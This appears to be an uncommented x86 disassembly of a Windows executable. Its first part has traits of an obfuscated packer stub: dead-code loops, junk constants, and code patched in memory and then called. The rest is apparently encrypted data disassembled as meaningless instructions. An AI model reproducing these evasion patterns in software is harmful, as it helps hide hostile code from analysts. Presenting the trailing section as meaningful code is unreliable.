  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xb099fb86
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x60]
  40bac3:	and    ebx,DWORD PTR [ecx+edi*4-0x5f9a7275]
  40baca:	lahf   
  40bacb:	and    al,0x81
  40bacd:	jge    0x40bad7
  40bacf:	std    
  40bad0:	cmp    eax,0x15f42a1f
  40bad5:	add    ebp,DWORD PTR [esi+0x3c]
  40bad8:	call   0x28e3854d
  40badd:	mov    ebp,0xca21fb22
  40bae2:	jns    0x40baa8
  40bae4:	(bad)  
  40bae5:	pop    eax
  40bae6:	cmp    DWORD PTR [ecx+0x37e60312],ebx
  40baec:	pop    ss
  40baed:	add    esp,DWORD PTR [edi+0x2c3fbfe7]
  40baf3:	or     bh,BYTE PTR [esi+0x2eb849d9]
  40baf9:	cdq    
  40bafa:	jne    0x40bae7
  40bafc:	arpl   WORD PTR [edi+0x26],sp
  40baff:	(bad)  
  40bb00:	adc    esi,ebx
  40bb02:	mov    bl,0xce
  40bb04:	shr    DWORD PTR ss:[ebx-0x21],0xeb
  40bb09:	dec    edi
  40bb0a:	xor    BYTE PTR [edx+edi*1],ch
  40bb0d:	sbb    al,ch
  40bb0f:	push   0x22
  40bb11:	mov    edx,0xd47d18f0
  40bb16:	data16 cmp bh,ah
  40bb19:	sub    BYTE PTR [edi+ebp*8],cl
  40bb1c:	sbb    dh,BYTE PTR [ebx-0x1f5d391f]
  40bb22:	sub    al,0x34
  40bb24:	jge    0x40bb1c
  40bb26:	cli    
  40bb27:	repz inc eax
  40bb29:	lds    esi,FWORD PTR [eax+0x4a]
  40bb2c:	sub    DWORD PTR ds:0x64f18deb,edx
  40bb32:	imul   edi,DWORD PTR [esi],0x50
  40bb35:	out    dx,eax
  40bb36:	sub    al,0x12
  40bb38:	xchg   edx,eax
  40bb39:	add    DWORD PTR [ecx-0x2d45a835],edx
  40bb3f:	adc    eax,0xaa13e0a5
  40bb44:	pop    edi
  40bb45:	shl    BYTE PTR [ebx+0xa],1
  40bb48:	jbe    0x40badb
  40bb4a:	inc    ebp
  40bb4b:	push   ss
  40bb4c:	ret    0x3748
  40bb4f:	dec    eax
  40bb50:	xlat   BYTE PTR ds:[ebx]
  40bb51:	inc    ecx
  40bb52:	mov    cl,0x18
  40bb54:	jp     0x40bb47
  40bb56:	(bad)  
  40bb57:	mov    ah,BYTE PTR [edx]
  40bb59:	and    al,0xe2
  40bb5b:	jle    0x40bb59
  40bb5d:	(bad)  
  40bb5e:	sti    
  40bb5f:	(bad)  
  40bb60:	leave  
  40bb61:	pushf  
  40bb62:	aad    0xbb
  40bb64:	add    dh,cl
  40bb66:	mov    eax,0xa1ffed84
  40bb6b:	fmul   QWORD PTR [ecx+0x28abba14]
  40bb71:	add    eax,0x73464d95
  40bb76:	inc    edi
  40bb77:	and    al,0xe3
  40bb79:	adc    eax,esp
  40bb7b:	add    bh,bh
  40bb7d:	mov    bh,0xb2
  40bb7f:	pop    edx
  40bb80:	sub    eax,0xeb9ae4ac
  40bb85:	icebp  
  40bb86:	sub    DWORD PTR [edx-0x19],edi
  40bb89:	xchg   esp,eax
  40bb8a:	shl    BYTE PTR [edi+eiz*8],1
  40bb8d:	mov    edx,0xc3e4fbb2
  40bb92:	pop    ds
  40bb93:	in     eax,dx
  40bb94:	shl    edi,0x86
  40bb97:	imul   edi,esp,0x5e
  40bb9a:	jae    0x40bb8d
  40bb9c:	push   es
  40bb9d:	(bad)  
  40bb9e:	dec    ebp
  40bb9f:	in     eax,0xee
  40bba1:	inc    ebp
  40bba2:	ins    DWORD PTR es:[edi],dx
  40bba3:	xchg   edx,eax
  40bba4:	adc    al,0x67
  40bba6:	push   ecx
  40bba7:	aad    0x52
  40bba9:	push   ebp
  40bbaa:	call   0xc4be697e
  40bbaf:	mov    esp,0xdb4a70e8
  40bbb4:	addr16 iret 
  40bbb6:	jl     0x40bb49
  40bbb8:	mov    eax,ds:0x128291d
  40bbbd:	inc    ebx
  40bbbe:	hlt    
  40bbbf:	out    dx,al
  40bbc0:	pop    edx
  40bbc1:	push   esi
  40bbc2:	mov    ah,0xd1
  40bbc4:	sar    BYTE PTR [eax],0x57
  40bbc7:	outs   dx,BYTE PTR ds:[si]
  40bbc9:	jmp    0xd927c3ef
  40bbce:	jnp    0x40bc21
  40bbd0:	xchg   ebp,eax
  40bbd1:	jne    0x40bbe6
  40bbd3:	sbb    DWORD PTR [esi-0x19],ebp
  40bbd6:	scas   al,BYTE PTR es:[edi]
  40bbd7:	jp     0x40bc3b
  40bbd9:	xchg   BYTE PTR [ecx-0x3],dl
  40bbdc:	(bad)  
  40bbde:	je     0x40bbde
  40bbe0:	mov    edi,0xa96f958b
  40bbe5:	mov    al,ds:0x8eb95b1b
  40bbea:	loop   0x40bbe1
  40bbec:	test   DWORD PTR [edx-0x55],ecx
  40bbef:	push   ebp
  40bbf0:	xchg   ecx,eax
  40bbf1:	and    esp,DWORD PTR [esi+0x4499d3ff]
  40bbf7:	or     BYTE PTR [ecx],ah
  40bbf9:	xchg   esi,eax
  40bbfa:	fnstcw WORD PTR [edx-0x12c4d779]
  40bc00:	mov    WORD PTR ds:0x2b003202,gs
  40bc06:	cli    
  40bc07:	loopne 0x40bc23
  40bc09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc0a:	(bad)  
  40bc0b:	imul   eax,DWORD PTR [edi+0x70],0xcd22e0dc
  40bc12:	mov    eax,0x42f5206
  40bc17:	sahf   
  40bc18:	and    DWORD PTR [esi],esi
  40bc1a:	cld    
  40bc1b:	outs   dx,DWORD PTR ds:[esi]
  40bc1c:	jbe    0x40bbcd
  40bc1e:	mov    ch,0x11
  40bc20:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc22:	fwait
  40bc23:	scas   al,BYTE PTR es:[edi]
  40bc24:	and    al,BYTE PTR [esi]
  40bc26:	pushf  
  40bc27:	mov    cl,0x8b
  40bc29:	clc    
  40bc2a:	jl     0x40bc48
  40bc2c:	daa    
  40bc2d:	inc    edx
  40bc2e:	hlt    
  40bc2f:	out    dx,al
  40bc30:	cmovg  edx,esp
  40bc33:	jle    0x40bc89
  40bc35:	xchg   esp,eax
  40bc36:	xchg   esi,eax
  40bc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc38:	mov    esi,0x3d15fe47
  40bc3d:	leave  
  40bc3e:	push   esi
  40bc3f:	mov    ebp,0x3917637d
  40bc44:	add    ecx,ebx
  40bc46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc47:	fsub   st,st(4)
  40bc49:	inc    ebp
  40bc4a:	into   
  40bc4b:	mov    WORD PTR [edx-0x6a],?
  40bc4e:	js     0x40bc4d
  40bc50:	dec    esp
  40bc51:	test   BYTE PTR [ecx],dh
  40bc53:	rcl    DWORD PTR [esp+ebp*4],1
  40bc56:	adc    al,0x19
  40bc58:	daa    
  40bc59:	std    
  40bc5a:	imul   ecx,DWORD PTR [ecx],0xffffffbb
  40bc5d:	dec    edi
  40bc5e:	xchg   edx,esp
  40bc60:	das    
  40bc61:	inc    eax
  40bc62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc63:	or     al,0xd5
  40bc65:	add    BYTE PTR [ebp+esi*2-0x5b8f57ec],ah
  40bc6c:	push   edi
  40bc6d:	cmp    dl,ch
  40bc6f:	and    edi,DWORD PTR [eax]
  40bc71:	add    eax,0xbd39a1e0
  40bc76:	lods   al,BYTE PTR ds:[esi]
  40bc77:	push   cs
  40bc78:	leave  
  40bc79:	mov    esp,0xda66b34c
  40bc7e:	or     eax,0x57ea5af6
  40bc83:	fiadd  WORD PTR [ebp+eax*1-0x2e]
  40bc87:	pusha  
  40bc88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc89:	and    al,0x21
  40bc8b:	popf   
  40bc8c:	mov    bh,0x6
  40bc8e:	xchg   esp,ebx
  40bc90:	dec    edx
  40bc91:	sbb    ebp,DWORD PTR [ebp+0x528fda9d]
  40bc97:	(bad)  
  40bc98:	sub    ch,al
